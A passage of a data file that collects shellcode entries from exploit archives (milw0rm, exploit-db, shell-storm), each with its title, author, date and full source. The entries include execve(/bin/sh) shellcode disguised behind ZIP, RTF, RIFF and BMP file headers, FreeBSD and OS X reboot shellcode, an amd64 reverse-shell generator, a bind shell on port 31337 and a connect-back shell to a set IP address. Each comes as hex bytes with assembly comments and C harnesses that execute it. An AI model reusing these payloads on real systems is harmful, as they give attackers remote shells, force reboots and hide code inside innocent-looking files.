%edi,%ebx", "  \"\\x66\\xb9\\x69\\x7a\"            // mov    $0x7a69,%cx", "  \"\\xcd\\x80\"                    // int    $0x80", "", "  /* write(fd_device, *buf, 1025) */", "", "", "  \"\\x89\\x14\\x34\"                // mov    %edx,(%esp,%esi,1)", "  \"\\x6a\\x04\"                    // push   $0x4", "  \"\\x58\"                        // pop    %eax", "  \"\\x54\"                        // push   %esp", "  \"\\x59\"                        // pop    %ecx", "  \"\\x56\"                        // push   %esi", "  \"\\x5a\"                        // pop    %edx", "  \"\\x42\"                        // inc    %edx", "  \"\\xcd\\x80\"                    // int    $0x80", "", "  /* close(fd_device) */", "", "  \"\\xb0\\x06\"                    // mov    $0x6,%al", "  \"\\xcd\\x80\"                    // int    $0x80", "", "  /* exit(anything) */", "", "  \"\\xb0\\x01\"                    // mov    $0x1,%al", "  \"\\xcd\\x80\"                    // int    $0x80", ";", "", "int main() {", " ", "        int (*f)() = (int(*)())shellcode;", "        printf(\"Length: %u\\n\", strlen(shellcode));", "        f();", "}", "", "// milw0rm.com [2006-04-16]"]},
{"Title": "Linux/x86 - execve(/bin/sh) + '.ZIP' Header Shellcode (28 bytes)", "Author": "izik", "Published": ": 2006-04-17", "Platform": "Linux_x86", "Download": "http://shell-storm.org/shellcode/files/shellcode-223.php", "View": null, "code": ["/*", " * (linux/x86) - execve(\"/bin/sh\", [\"/bin/sh\", NULL]) + ZIP Header - 28 bytes", " *", " * root@magicbox:~# file linux-sh-ziphdr.bin", " * linux-sh-ziphdr.bin: Zip archive data", " *", " * - izik <izik@tty64.org>", " */", "", "char shellcode[] = ", "", "\t//", "\t// ZIP Header (5 bytes)", "\t//", "", "\t\"\\x50\"                  // push %eax ", "\t\"\\x4b\"                  // dec %ebx ", "\t\"\\x03\\x04\\x24\"          // add (%esp),%eax ", "", "\t//", "\t// execve(\"/bin/sh\", [\"/bin/sh\", NULL]);", "\t//", "", "\t\"\\x6a\\x0b\"              // push $0xb ", "\t\"\\x58\"                  // pop %eax ", "\t\"\\x99\"                  // cltd ", "\t\"\\x52\"                  // push %edx ", "\t\"\\x68\\x2f\\x2f\\x73\\x68\"  // push $0x68732f2f ", "\t\"\\x68\\x2f\\x62\\x69\\x6e\"  // push $0x6e69622f ", "\t\"\\x89\\xe3\"              // mov %esp,%ebx ", "\t\"\\x52\"                  // push %edx ", "\t\"\\x53\"                  // push %ebx ", "\t\"\\x89\\xe1\"              // mov %esp,%ecx ", "\t\"\\xcd\\x80\";             // int $0x80 ", "", "int main(int argc, char **argv) {", "\tint *ret;", "\tret = (int *)&ret + 2;", "\t(*ret) = (int) shellcode;", "}", "", "// milw0rm.com [2006-04-17]"]},
{"Title": "Linux/x86 - execve(/bin/sh) + '.RTF' Header Shellcode (30 bytes)", "Author": "izik", "Published": ": 2006-04-17", "Platform": "Linux_x86", "Download": "http://shell-storm.org/shellcode/files/shellcode-224.php", "View": null, "code": ["/*", " * (linux/x86) - execve(\"/bin/sh\", [\"/bin/sh\", NULL]) + RTF header - 30 bytes", " *", " * root@magicbox:~# file linux-sh-rtfhdr.bin", " * linux-sh-rtfhdr.bin: Rich Text Format data, version 1,", " *", " * - izik <izik@tty64.org>", " */", "", "char shellcode[] = ", "", "\t//", "\t// RTF Header (7 bytes) ", "\t// - Be careful not to trigger any of those expressions.", "\t//", "", "\t\"\\x7b\\x5c\"              // jnp 80480d2 <_start+0x5e> ", "\t\"\\x72\\x74\"              // jb 80480ec <_start+0x78> ", "\t\"\\x66\\x31\\xc0\"          // xor %ax,%ax ", "", "\t//", "\t// execve(\"/bin/sh\", [\"/bin/sh\", NULL]);", "\t//", "", "\t\"\\x6a\\x0b\"              // push $0xb ", "\t\"\\x58\"                  // pop %eax ", "\t\"\\x99\"                  // cltd ", "\t\"\\x52\"                  // push %edx ", "\t\"\\x68\\x2f\\x2f\\x73\\x68\"  // push $0x68732f2f ", "\t\"\\x68\\x2f\\x62\\x69\\x6e\"  // push $0x6e69622f ", "\t\"\\x89\\xe3\"              // mov %esp,%ebx ", "\t\"\\x52\"                  // push %edx ", "\t\"\\x53\"                  // push %ebx ", "\t\"\\x89\\xe1\"              // mov %esp,%ecx ", "\t\"\\xcd\\x80\";             // int $0x80 ", "", "int main(int argc, char **argv) {", "\tint *ret;", "\tret = (int *)&ret + 2;", "\t(*ret) = (int) shellcode;", "}", "", "// milw0rm.com [2006-04-17]"]},
{"Title": "Linux/x86 - execve(/bin/sh) + '.RIFF' Header Shellcode (28 bytes)", "Author": "izik", "Published": ": 2006-04-17", "Platform": "Linux_x86", "Download": "http://shell-storm.org/shellcode/files/shellcode-225.php", "View": null, "code": ["/*", " * (linux/x86) - execve(\"/bin/sh\", [\"/bin/sh\", NULL]) + RIFF Header - 28 bytes", " *", " * root@magicbox:~# file linux-sh-riffhdr.bin", " * linux-sh-riffhdr.bin: RIFF (little-endian) data", " *", " * - izik <izik@tty64.org>", " */", "", "char shellcode[] = ", "", "\t//", "\t// RIFF Header (5 bytes)", "\t//", "", "\t\"\\x52\"                  // push %edx ", "\t\"\\x49\"                  // dec %ecx ", "\t\"\\x46\"                  // inc %esi ", "\t\"\\x46\"                  // inc %esi ", "\t\"\\x40\"                  // inc %eax ", "", "\t//", "\t// execve(\"/bin/sh\", [\"/bin/sh\", NULL]);", "\t//", "", "\t\"\\x6a\\x0b\"              // push $0xb ", "\t\"\\x58\"                  // pop %eax ", "\t\"\\x99\"                  // cltd ", "\t\"\\x52\"                  // push %edx ", "\t\"\\x68\\x2f\\x2f\\x73\\x68\"  // push $0x68732f2f ", "\t\"\\x68\\x2f\\x62\\x69\\x6e\"  // push $0x6e69622f ", "\t\"\\x89\\xe3\"              // mov %esp,%ebx ", "\t\"\\x52\"                  // push %edx ", "\t\"\\x53\"                  // push %ebx ", "\t\"\\x89\\xe1\"              // mov %esp,%ecx ", "\t\"\\xcd\\x80\";             // int $0x80 ", "", "int main(int argc, char **argv) {", "\tint *ret;", "\tret = (int *)&ret + 2;", "\t(*ret) = (int) shellcode;", "}", "", "// milw0rm.com [2006-04-17]"]},
{"Title": "Linux/x86 - execve(/bin/sh) + '.BMP' Bitmap Header Shellcode (27 bytes)", "Author": "izik", "Published": ": 2006-04-17", "Platform": "Linux_x86", "Download": "http://shell-storm.org/shellcode/files/shellcode-226.php", "View": null, "code": ["", "/*", " * (linux/x86) - execve(\"/bin/sh\", [\"/bin/sh\", NULL]) + Bitmap 24bit Header - 27 bytes", " *", " * root@magicbox:~# file linux-sh-bm24bhdr.bin", " * linux-sh-bm24bhdr.bin: PC bitmap data", " *", " * - izik <izik@tty64.org>", " */", "", "char shellcode[] = ", "", "\t//", "\t// Bitmap 24bit Header (4 bytes)", "\t//", "", "\t\"\\x42\"                  // inc %edx ", "\t\"\\x4d\"                  // dec %ebp ", "\t\"\\x36\"                  // ss ", "\t\"\\x91\"                  // xchg %eax,%ecx ", "", "\t//", "\t// execve(\"/bin/sh\", [\"/bin/sh\", NULL]);", "\t//", "", "\t\"\\x6a\\x0b\"              // push $0xb ", "\t\"\\x58\"                  // pop %eax ", "\t\"\\x99\"                  // cltd ", "\t\"\\x52\"                  // push %edx ", "\t\"\\x68\\x2f\\x2f\\x73\\x68\"  // push $0x68732f2f ", "\t\"\\x68\\x2f\\x62\\x69\\x6e\"  // push $0x6e69622f ", "\t\"\\x89\\xe3\"              // mov %esp,%ebx ", "\t\"\\x52\"                  // push %edx ", "\t\"\\x53\"                  // push %ebx ", "\t\"\\x89\\xe1\"              // mov %esp,%ecx ", "\t\"\\xcd\\x80\";             // int $0x80 ", "", "int main(int argc, char **argv) {", "\tint *ret;", "\tret = (int *)&ret + 2;", "\t(*ret) = (int) shellcode;", "}", "", "// milw0rm.com [2006-04-17]"]},
{"Title": "Linux/x86 - Reverse (127.0.0.1:80/TCP) Shell + XOR Encoded Shellcode (371 bytes)", "Author": "xort", "Published": ": 2006-04-18", "Platform": "Linux_x86", "Download": null, "View": null, "code": ["# linux/x86 xor-encoded Connect Back Shellcode 371 bytes", "", "https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/13366.tar.gz (black-RXenc-con-back.tar.gz)", "", "# milw0rm.com [2006-04-18]"]},
{"Title": "FreeBSD/x86 - reboot(RB_AUTOBOOT) Shellcode (7 bytes)", "Author": "IZ", "Published": ": 2006-04-19", "Platform": "FreeBSD_x86", "Download": "http://shell-storm.org/shellcode/files/shellcode-101.php", "View": null, "code": ["/*", " *", " * FreeBSD_x86-reboot-7b.c (Shellcode, reboot(RB_AUTOBOOT), 7 bytes)", " *", " * by IZ <guerrilla.sytes.net>", " *", " */", "", "", "char shellcode[] =", "\"\\x31\\xc0\"                  /* xor %eax,%eax */", "", "\"\\x50\"                      /* push %eax */", "\"\\xb0\\x37\"                  /* mov $0x37,%al */", "\"\\xcd\\x80\";                 /* int $0x80 */", "", "", "void main()", "{", "     int*     ret;         ", "", "     ret = (int*) &ret + 2;", "", "     printf(\"len %d\\n\",strlen(shellcode));", "", "     (*ret) = (int) shellcode; ", "}", "", "// milw0rm.com [2006-04-19]"]},
{"Title": "Linux/x64 - Reverse (/TCP) Shell (/bin/bash) + Semi-Stealth Shellcode (88+ bytes) (Generator)", "Author": "phar", "Published": ": 2006-04-21", "Platform": "Generator", "Download": "https://old.exploit-db.com/download/13297.c", "View": "https://old.exploit-db.com/raw/13297/", "code": ["#include <sys/socket.h>", "#include <netinet/in.h>", "#include <arpa/inet.h>", "#include <stdlib.h>", "#include <stdio.h>", "#include <string.h>", "#include <limits.h>", "", "", "/*", "", "\tusual rant here.. this is just a doodle.. i was curious about", "\tthe amd64 and since i dont think a simple exec /bin/sh is worth releasing", "\t", "\ti give you, my amd64 connect-back semi-stealth shellcode.. i say semi-stelth", "\tbecause it contains the bullshit feature that /bin/bash isnt /easily/ noticable", "\t", "\tthis code uses both 32 and 64 bit instructions, and uses only 64 bit kernel entrypoints", "\t", "\tif you might say \"but..phar.. linux has 32 bit compatability.. and i can just use existing shellcode\"", "\t", "\tto that my answer is \"fuck you\".. i mean.. \"there is actually an option to disable 32bit compatability..", "\ti checked.. its there... i promise\"", "\t", "\tim not entirely sure the C crap below will do what you want.. but the shellcode is good and can be edited", "\tby hand if needed.. (dont forget to invert)", "\t", "\tbpp.etherdyne.net", "\twww.stonedcoder.org", "\tphar[at]stonedcoder[dot]org", "", "*/", "", "char sc_raw[] = ", "\"\\x48\\x31\\xd2\"                     // xor    %rdx,%rdx", "\"\\x6a\\x01\"                         // pushq  $0x1", "\"\\x5e\"                             // pop    %rsi", "\"\\x6a\\x02\"                         // pushq  $0x2", "\"\\x5f\"                             // pop    %rdi", "\"\\x6a\\x29\"                         // pushq  $0x29", "\"\\x58\"                             // pop    %rax", "\"\\x0f\\x05\"                         // syscall\t\t\t\t\t\t\t\t#socket", "", "\"\\x48\\x97\"                         // xchg   %rax,%rdi\t\t\t\t\t\t#in_sockaddr, rax does equal 2 but i think i can get away with this", "\"\\x50\"                             // push   %rax", "\"\\x48\\xb9\\x00\\x00\\x00\\x00\\x11\"     // mov    $0x4141414141414141,%rcx", "\"\\x11\\xff\\xfd\"", "\"\\x48\\xf7\\xd1\"                     // not    %rcx", "\"\\x51\"                             // push   %rcx", "\"\\x48\\x89\\xe6\"                     // mov    %rsp,%rsi", "\"\\x6a\\x10\"                         // pushq  $0x10", "\"\\x5a\"                             // pop    %rdx", "\"\\x6a\\x2a\"                         // pushq  $0x2a", "\"\\x58\"                             // pop    %rax", "\"\\x0f\\x05\"                         // syscall\t\t\t\t\t\t\t\t#connect", "", "\"\\x6a\\x03\"                         // pushq  $0x3", "\"\\x5e\"                             // pop    %rsi", "//dup_loop:", "\"\\x6a\\x21\"                         // pushq  $0x21", "\"\\x58\"                             // pop    %rax", "\"\\x48\\xff\\xce\"                     // dec    %rsi", "\"\\x0f\\x05\"                         // syscall\t\t\t\t\t\t\t\t#dup2", "", "", "\"\\x75\\xf6\"                         // jne    4004c5 <dup_loop>", "\"\\x48\\xbb\\xd0\\x9d\\x96\\x91\\xd0\"     // mov    $0xff978cd091969dd0,%rbx", "\"\\x8c\\x97\\xff\"", "\"\\x48\\xf7\\xd3\"                     // not    %rbx", "\"\\x53\"                             // push   %rbx", "\"\\x48\\x89\\xe7\"                     // mov    %rsp,%rdi", "\"\\x48\\x31\\xc0\"                     // xor    %rax,%rax", "\"\\x50\"                             // push   %rax", "\"\\x57\"                             // push   %rdi", "\"\\x48\\x89\\xe6\"                     // mov    %rsp,%rsi", "\"\\x48\\x31\\xd2\"                     // xor    %rdx,%rdx", "\"\\xb0\\x3b\"                         // mov    $0x3b,%al", "\"\\x0f\\x05\"                         // syscall\t\t\t\t\t\t\t\t#exec", ";", "", "#define HOSTOFFSET 19", "#define PORTOFFSET 23", "", "void scprint(char * foo, int len);", "void usage();", "", "void (*shellcode)() = sc_raw;", "", "main(int argc, char *argv[]){", "uint32 host;", "uint16 port;", "", "", "\tif(argc != 3){\t//i'll only do so much to save you from stupidity", "\t\tusage();", "\t\texit(1);", "\t}", "", "\thost =~ (int)inet_addr(argv[1]);", "", "\tport =~ htons(atoi(argv[2]));", "", "\tmemcpy(&sc_raw[HOSTOFFSET],&host,4);", "\tmemcpy(&sc_raw[PORTOFFSET],&port,2);", "\tscprint(sc_raw,sizeof(sc_raw));", "\tshellcode();", "}", "", "", "void scprint(char * foo, int len){", "int i;", "", "\tprintf(\"char shellcode[]=\\\"\");", "\tfor(i = 0; i < len; i++){", "\t\tprintf(\"\\\\x%02x\",(char)foo[i]&0xff);", "\t}", "\tprintf(\"\\\";\\n\");", "\tfflush(stdout);", "}", "", "void usage(){", "\tprintf(\"./%s [<ip address.. and i mean ip address>] [<port number>]\\n\\n\");", "}", "", "// milw0rm.com [2006-04-21]"]},
{"Title": "Linux/x86 - execve(/bin/sh) Shellcode (24 bytes) (2)", "Author": "hophet", "Published": ": 2006-05-01", "Platform": "Linux_x86", "Download": "https://old.exploit-db.com/download/13365.c", "View": "https://old.exploit-db.com/raw/13365/", "code": ["/*", " * [Linux/x86]", " * Shellcode for: execve(\"/bin/sh\", [\"/bin/sh\"], NULL)", " * 24 bytes", " * hophet [at] gmail.com", " * http://www.nlabs.com.br/~hophet/", " * ", " */", "", "char shellcode[] = ", "", "\"\\x99\"                         // cltd   ", "\"\\x31\\xc0\"                     // xor    %eax,%eax", "\"\\x52\"                         // push   %edx", "\"\\x68\\x6e\\x2f\\x73\\x68\"         // push   $0x68732f6e", "\"\\x68\\x2f\\x2f\\x62\\x69\"         // push   $0x69622f2f", "\"\\x89\\xe3\"                     // mov    %esp,%ebx", "\"\\x52\"                         // push   %edx", "\"\\x53\"                         // push   %ebx", "\"\\x89\\xe1\"                     // mov    %esp,%ecx", "\"\\xb0\\x0b\"                     // mov    $0xb,%al", "\"\\xcd\\x80\";                    // int    $0x80", "", "int main() {", "", "\tvoid (*p)();", "\tp = (void *)&shellcode;", "\tprintf(\"Lenght: %d\\n\", strlen(shellcode));", "\tp();", "}", "", "// milw0rm.com [2006-05-01]"]},
{"Title": "OpenBSD/x86 - execve(/bin/sh) Shellcode (23 bytes)", "Author": "hophet", "Published": ": 2006-05-01", "Platform": "OpenBSD_x86", "Download": "http://shell-storm.org/shellcode/files/shellcode-163.php", "View": null, "code": ["/*", " * [OpenBSD/x86]", " * Shellcode for: execve(\"/bin/sh\", [\"/bin/sh\"], NULL)", " * 23 bytes", " * hophet [at] gmail.com", " * http://www.nlabs.com.br/~hophet/", " *", " * Fancy mappings by iruata souza (muzgo)", " * iru.muzgo!gmail.com", " * http://openvms-rocks.com/~muzgo/", " */", "", "#include <sys/types.h>", "#include <sys/stat.h>", "#include <sys/mman.h>", "", "#include <err.h>", "#include <fcntl.h>", "#include <stdio.h>", "#include <string.h>", "#include <unistd.h>", " ", "char shellcode[] =", "", "\"\\x99\"\t\t\t\t\t/* cltd */", "\"\\x52\"\t\t\t\t\t/* push\t%edx */", "\"\\x68\\x6e\\x2f\\x73\\x68\"\t\t\t/* push\t$0x68732f6e */", "\"\\x68\\x2f\\x2f\\x62\\x69\"\t\t\t/* push\t$0x69622f2f */", "\"\\x89\\xe3\"\t\t\t\t/* mov\t%esp,%ebx */", "\"\\x52\"\t\t\t\t\t/* push\t%edx */", "\"\\x54\"\t\t\t\t\t/* push\t%esp */", "\"\\x53\"                          \t/* push\t%ebx */", "\"\\x53\"\t\t\t\t\t/* push\t%ebx */", "\"\\x6a\\x3b\"\t\t\t\t/* push\t$0x3b */", "\"\\x58\"\t\t\t\t\t/* pop\t%eax */", "\"\\xcd\\x80\";\t\t\t\t/* int\t$0x80 */", "", "/*", " * Since shellcode above will be mapped in .rodata (read-only protection),", " * we need to write it to a file and map the file with PROT_EXEC in order", " * to execute it.", " */", "", "int main(void)", "{", "        void (*p)();", "\tint fd;", "\t", "\tfd=open(\"/tmp/. \", O_RDWR|O_CREAT, S_IRUSR|S_IWUSR);", "\tif(fd < 0)", "\t\terr(1, \"open\");", "\t", "\twrite(fd, shellcode, strlen(shellcode));", "\tif((lseek(fd, 0L, SEEK_SET)) < 0)", "\t\terr(1, \"lseek\");", "", "\tp = (void (*)())mmap(NULL, strlen(shellcode), PROT_READ|PROT_EXEC, NULL, fd, NULL);", "\tif (p == (void (*)())MAP_FAILED)", "\t\terr(1, \"mmap\");", "\tp();", "\treturn 0;", "}", "", "// milw0rm.com [2006-05-01]"]},
{"Title": "OSX/PPC - sync() + reboot() Shellcode (32 bytes)", "Author": "hophet", "Published": ": 2006-05-01", "Platform": "OSX_PPC", "Download": "http://shell-storm.org/shellcode/files/shellcode-130.php", "View": null, "code": ["/*", " * [MacOSX/PowerPC]", " * Shellcode for: sync(), reboot()", " * 32 bytes", " * hophet [at] gmail.com", " * http://www.nlabs.com.br/~hophet/", " *", " */", "", "#include <stdio.h>", "#include <string.h>", "", "char shellcode[] = ", "", "\"\\x7c\\x63\\x1a\\x79\"", "\"\\x39\\x40\\x01\\x06\"", "\"\\x38\\x0a\\xff\\x1e\"", "\"\\x44\\xff\\xff\\x02\"", "\"\\x60\\x60\\x60\\x60\"", "\"\\x39\\x40\\x01\\x19\"", "\"\\x38\\x0a\\xff\\x1e\"", "\"\\x44\\xff\\xff\\x02\";", "", "int main() {", "", "\tvoid (*p)();", "\tp = (void *)&shellcode;", "\tprintf(\"Lenght: %d\\n\", strlen(shellcode));", "\tp();", "}", "", "/*", ".globl _main", ".text", "_main:", "\txor.\tr3, r3,r3\t// r3 = NULL", "\tli\tr10, 226+36", "\taddi\tr0, r10, -226\t// r0 = 36", "\t.long\t0x44ffff02\t// sc opcode", "\t.long\t0x60606060\t// NOP", "\tli\tr10, 226+55", "\taddi\tr0, r10, -226\t// r0 = 55", "\t.long\t0x44ffff02\t// sc opcode ", "*/", "", "// milw0rm.com [2006-05-01]"]},
{"Title": "OSX/PPC - execve(/bin/sh) + exit() Shellcode (72 bytes)", "Author": "hophet", "Published": ": 2006-05-01", "Platform": "OSX_PPC", "Download": "https://old.exploit-db.com/download/13479.c", "View": "https://old.exploit-db.com/raw/13479/", "code": ["/*", " * [MacOSX/PowerPC]", " * Shellcode for: execve(\"/bin/sh\", [\"/bin/sh\"], NULL), exit()", " * 72 bytes", " * hophet [at] gmail.com", " * http://www.nlabs.com.br/~hophet/", " *", " */", "", "#include <stdio.h>", "#include <string.h>", "", "char shellcode[] = ", "", "\"\\x7c\\xa5\\x2a\\x79\"", "\"\\x40\\x82\\xff\\xfd\"", "\"\\x7d\\x68\\x02\\xa6\"", "\"\\x3b\\xeb\\x01\\x71\"", "\"\\x39\\x40\\x01\\x71\"", "\"\\x39\\x1f\\xfe\\xce\"", "\"\\x7c\\xa8\\x29\\xae\"", "\"\\x38\\x7f\\xfe\\xc7\"", "\"\\x90\\x61\\xff\\xf8\"", "\"\\x90\\xa1\\xff\\xfc\"", "\"\\x38\\x81\\xff\\xf8\"", "\"\\x38\\x0a\\xfe\\xca\"", "\"\\x44\\xff\\xff\\x02\"", "\"\\x60\\x60\\x60\\x60\"", "\"\\x38\\x0a\\xfe\\x90\"", "\"\\x44\\xff\\xff\\x02\"", "\"\\x2f\\x62\\x69\\x6e\"", "\"\\x2f\\x73\\x68\\x54\";", "", "int main() {", "", "\tvoid (*p)();", "\tp = (void *)&shellcode;", "\tprintf(\"Lenght: %d\\n\", strlen(shellcode));", "\tp();", "}", "/*", ".globl _main", ".text", "_main:", "        xor.    r5, r5, r5\t// r5 = NULL", "        bnel    _main", "        mflr    r11", "        addi    r31, r11, 369", "        li      r10, 369", "        addi    r8, r31, -306", "        stbx    r5, r8, r5", "        addi    r3, r31, -313", "        stw     r3, -8(r1)\t// [/bin/sh]", "        stw     r5, -4(r1)", "        subi    r4, r1, 8\t// [/bin/sh]", "        addi    r0, r10, -310\t// r0 = 59", "        .long   0x44ffff02\t// sc opcode", "        .long\t0x60606060\t// NOP", "        addi    r0, r10, -368\t// r0 = 1", "        .long   0x44ffff02\t// sc opcode", "string:\t.asciz\t\"/bin/shT\"", "*/", "", "// milw0rm.com [2006-05-01]"]},
{"Title": "Linux/x86 - Bind (31337/TCP) Shell (/bin/sh) Shellcode (100 bytes)", "Author": "Benjamin Orozco", "Published": ": 2006-05-08", "Platform": "Linux_x86", "Download": "http://shell-storm.org/shellcode/files/shellcode-238.php", "View": null, "code": ["/*---------------------------------------------------------------------------*", " *                 100 byte Portbind shellcode                               *", " *              by Benjamin Orozco - benoror@gmail.com                       *", " *---------------------------------------------------------------------------*", " *    filename: x86-linux-portbind.c                                         *", " * discription: x86-linux portbind shellcode.\t\t\t\t     *", " *\t\tPretty big but excellent for educational purposes.\t     *", " *\t\tUse SET_PORT() before using the shellcode. Example:\t     *", " *\t\t\t\t\t\t\t\t\t     *", " *\t\t\tSET_PORT(sc, 31337);\t\t\t             *", " *\t\t\t\t\t\t\t\t\t     *", " *___________________________________________________________________________*", " *---------------------------------------------------------------------------*/", "", "/*---------------------------------------------------------------------------*", " *\t\t\t\tASM Code\t                             *", " *---------------------------------------------------------------------------*", "", "# s = socket(2, 1, 0)", "push   $0x66\t\t\t#", "pop    %eax\t\t\t# 0x66 = socketcall", "push   $0x1\t\t\t#", "pop    %ebx\t\t\t# socket() = 1", "xor    %ecx,%ecx\t\t#", "push   %ecx\t\t\t# 0", "push   $0x1\t\t\t# SOCK_STREAM = 1", "push   $0x2\t\t\t# AF_INET = 2", "mov    %esp,%ecx\t\t# Arguments", "int    $0x80\t\t\t# EXECUTE - Now %eax have the s fileDescriptor", "", "# bind(s [2, 64713, 0], 0x10)", "xor    %edx,%edx", "push   %edx\t\t\t# INADDR_ANY = 0", "pushw  $0xc9fc\t\t\t# PORT = 64713", "pushw  $0x2\t\t\t# AF_INET = 2", "mov    %esp,%ecx\t\t# %ecx holds server struct", "push   $0x10\t\t\t# sizeof(server) = 10", "push   %ecx\t\t\t# server struct", "push   %eax\t\t\t# s fileDescriptor", "mov    %esp,%ecx", "mov    %eax,%esi\t\t# now %esi holds s fileDescriptor", "push   $0x2\t\t\t#", "pop    %ebx\t\t\t# bind() = 2", "push   $0x66\t\t\t#", "pop    %eax\t\t\t# 0x66 = socketcall", "int    $0x80\t\t\t# On success: %eax = 0", "", "# listen(s, 0)", "push   $0x66\t\t\t#", "pop    %eax\t\t\t# 0x66 = socketcall", "push   $0x4\t\t\t#", "pop    %ebx\t\t\t# listen() = 4", "int    $0x80\t\t\t# On success: %eax = 0", "", "# c = accept(s, 0, 0)", "xor    %ecx,%ecx", "push   %ecx", "push   %ecx", "push   %esi\t\t\t# %esi = s", "mov    %esp,%ecx\t\t# Arguments", "push   $0x5\t\t\t#", "pop    %ebx\t\t\t# accept() = 5", "push   $0x66\t\t\t#", "pop    %eax\t\t\t# 0x66 = socketcall", "int    $0x80\t\t\t# EXECUTE - Now %eax have c fileDescriptor", "", "# dup2(c, 2) , dup2(c, 1) , dup2(c, 0)", "xchg   %eax,%ebx        \t# Put c fileDescriptor on %ebx [for dup2()]", "push   $0x2", "pop    %ecx", "dup_loop:", "mov    $0x3f,%al\t\t# dup2() = 0x3f", "int    $0x80", "dec    %ecx", "jns    dup_loop", "", "# execve(\"/bin//sh\", [\"/bin//sh\",NULL])", "mov    $0xb,%al\t\t\t# execve = 11d", "push   %edx", "push   $0x68732f2f", "push   $0x6e69622f", "mov    %esp,%ebx", "push   %edx", "push   %ebx", "mov    %esp, %ecx", "int    $0x80", "", "*----------------------------------------------------------------------------*/", "", "char sc[] =\t", "\"\\x6a\\x66\"                   \t//push   $0x66", "\"\\x58\"                      \t//pop    %eax", "\"\\x6a\\x01\"                   \t//push   $0x1", "\"\\x5b\"                      \t//pop    %ebx", "\"\\x31\\xc9\"                   \t//xor    %ecx,%ecx", "\"\\x51\"                      \t//push   %ecx", "\"\\x6a\\x01\"                   \t//push   $0x1", "\"\\x6a\\x02\"                   \t//push   $0x2", "\"\\x89\\xe1\"                   \t//mov    %esp,%ecx", "\"\\xcd\\x80\"                   \t//int    $0x80", "\"\\x31\\xd2\"                   \t//xor    %edx,%edx", "\"\\x52\"                      \t//push   %edx", "\"\\x66\\x68\\xfc\\xc9\"             \t//pushw  $0xc9fc\t//PORT", "\"\\x66\\x6a\\x02\"                \t//pushw  $0x2", "\"\\x89\\xe1\"                   \t//mov    %esp,%ecx", "\"\\x6a\\x10\"                   \t//push   $0x10", "\"\\x51\"                      \t//push   %ecx", "\"\\x50\"                      \t//push   %eax", "\"\\x89\\xe1\"                   \t//mov    %esp,%ecx", "\"\\x89\\xc6\"                   \t//mov    %eax,%esi", "\"\\x6a\\x02\"                   \t//push   $0x2", "\"\\x5b\"                      \t//pop    %ebx", "\"\\x6a\\x66\"                   \t//push   $0x66", "\"\\x58\"                      \t//pop    %eax", "\"\\xcd\\x80\"                   \t//int    $0x80", "\"\\x6a\\x66\"                   \t//push   $0x66", "\"\\x58\"                      \t//pop    %eax", "\"\\x6a\\x04\"                   \t//push   $0x4", "\"\\x5b\"                      \t//pop    %ebx", "\"\\xcd\\x80\"                   \t//int    $0x80", "\"\\x31\\xc9\"                   \t//xor    %ecx,%ecx", "\"\\x51\"                      \t//push   %ecx", "\"\\x51\"                      \t//push   %ecx", "\"\\x56\"                      \t//push   %esi", "\"\\x89\\xe1\"                   \t//mov    %esp,%ecx", "\"\\x6a\\x05\"                   \t//push   $0x5", "\"\\x5b\"                      \t//pop    %ebx", "\"\\x6a\\x66\"                   \t//push   $0x66", "\"\\x58\"                      \t//pop    %eax", "\"\\xcd\\x80\"                   \t//int    $0x80", "\"\\x93\"                      \t//xchg   %eax,%ebx", "\"\\x6a\\x02\"                   \t//push   $0x2", "\"\\x59\"                      \t//pop    %ecx", "\"\\xb0\\x3f\"                   \t//mov    $0x3f,%al", "\"\\xcd\\x80\"                   \t//int    $0x80", "\"\\x49\"                      \t//dec    %ecx", "\"\\x79\\xf9\"                   \t//jns    48 <dup_loop>", "\"\\xb0\\x0b\"                   \t//mov    $0xb,%al", "\"\\x52\"                      \t//push   %edx", "\"\\x68\\x2f\\x2f\\x73\\x68\"          //push   $0x68732f2f", "\"\\x68\\x2f\\x62\\x69\\x6e\"          //push   $0x6e69622f", "\"\\x89\\xe3\"                   \t//mov    %esp,%ebx", "\"\\x52\"                      \t//push   %edx", "\"\\x53\"                      \t//push   %ebx", "\"\\x89\\xe1\"                   \t//mov    %esp,%ecx", "\"\\xcd\\x80\";                   \t//int    $0x80", "", "void SET_PORT(char *buf, int port) {", "\t*(unsigned short *)(((buf)+22)) = (port);", "\tchar tmp = buf[22];", "\tbuf[22] = buf[23];", "\tbuf[23] = tmp;", "}", "", "main(){", "\tprintf(\"size: %d bytes\\n\", strlen(sc));", "\t", "\tSET_PORT(sc, 33333);", "\t__asm__(\"call sc\");", "}", "", "// milw0rm.com [2006-05-08]"]},
{"Title": "Linux/x86 - Reverse (192.168.13.22:31337/TCP) Shell (/bin/sh) Shellcode (82 bytes) (Generator)", "Author": "Benjamin Orozco", "Published": ": 2006-05-08", "Platform": "Generator", "Download": "http://shell-storm.org/shellcode/files/shellcode-239.php", "View": null, "code": ["/*---------------------------------------------------------------------------*", " *                 82 byte Connectback shellcode                             *", " *              by Benjamin Orozco - benoror@gmail.com                       *", " *---------------------------------------------------------------------------*", " *    filename: x86-linux-connectback.c                                      *", " * discription: x86-linux connect back shellcode. Use SET_PORT() and\t     *", " *\t\tSET_IP() before using the shellcode. Example:                *", " *\t\t\t\t\t\t\t\t\t     *", " *\t\t\tSET_IP(sc, \"192.168.13.22\");\t\t\t     *", " *\t\t\tSET_PORT(sc, 31337);\t\t\t\t     *", " *\t\t\t\t\t\t\t\t\t     *", " *___________________________________________________________________________*", " *---------------------------------------------------------------------------*/", "", "/*---------------------------------------------------------------------------*", " *\t\t\t\tASM Code\t\t\t\t     *", " *---------------------------------------------------------------------------*", "", "# s = socket(2, 1, 0)", "push   $0x66\t\t\t#", "pop    %eax\t\t\t# 0x66 = socketcall", "push   $0x1\t\t\t#", "pop    %ebx\t\t\t# socket() = 1", "xor    %ecx,%ecx\t\t#", "push   %ecx\t\t\t# 0", "push   $0x1\t\t\t# SOCK_STREAM = 1", "push   $0x2\t\t\t# AF_INET = 2", "mov    %esp,%ecx\t\t# Arguments", "int    $0x80\t\t\t# EXECUTE - Now %eax have the s fileDescriptor", "", "# connect(s, [2, 64713, 127.127.127], 0x10)", "push   $0x7f7f7f7f\t\t# 127.127.127 = 0x7f7f7f7f", "pushw  $0xc9fc\t\t\t# PORT = 64713", "pushw  $0x2\t\t\t# AF_INET = 2", "mov    %esp,%ecx\t\t# %ecx holds server struct", "push   $0x10\t\t\t# sizeof(server) = 10", "push   %ecx\t\t\t# server struct", "push   %eax\t\t\t# s fileDescriptor", "mov    %esp,%ecx", "mov    